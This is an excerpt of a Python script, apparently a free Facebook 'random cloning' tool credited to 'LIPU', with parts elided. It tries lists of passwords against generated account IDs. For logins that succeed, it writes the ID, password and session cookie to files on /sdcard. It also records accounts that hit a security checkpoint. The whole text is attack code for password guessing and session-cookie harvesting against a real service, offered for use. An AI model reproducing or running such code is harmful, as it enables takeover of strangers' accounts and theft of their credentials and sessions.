...
{W}──────────────────────────────────────────────────
{xd} DEVELOPER {xdxx} LI{Y}P{W}U
{xd} TOOLS     {xdxx} RANDOM{Y}|{W}CLONING
{xd} STATUS    {xdxx} Free 
{xd} Facebook {xdxx} LIPU KING
{xd} VIRSON {xdxx} 0.1
{W}──────────────────────────────────────────────────"""
#--------------------• COLOUR •--------------------#
def ___swag___():
    ...
    try:
        for ps in pss:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'live' in res:
                	print(f'\r{G}➤{Y}➤{G} LIPU-OK '+ids+' | '+ps+'\033[1;97m')
                	#print(f"\r{G}➤{Y}➤{G} MALS {Y}•{G} "+coki);linex()
                	open('/sdcard/LIPU-S1-RANDOM-OK-COKIE.txt','a').write(ids+'|'+ps+'|'+coki+'\n')
                	ok.append(ids)
                	break
                else:continue
                ...
                ids = "1000"+coki1[0:11]
                print(f'\r{G}➤{Y}➤{R} LIPU-CP '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/LIPU-S1-RANDOM-CP.txt','a').write(ids+'|'+ps+'\n')
                cp.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        for ps in pss:
            ...
            if 'c_user' in log_cookies:
                ...
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r{G}➤{Y}➤{G} LIPU-OK '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/LIPU-S2-RANDOM-OK-COKIE.txt','a').write(ids+'|'+ps+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ...
                ids = "1000"+coki1[0:11]
                print(f'\r{G}➤{Y}➤{R} LIPU-CP '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/LIPU-S2-RANDOM-CP.txt','a').write(ids+'|'+ps+'\n')
                cp.append(ids)
                break
            else:continue
        loop+=1
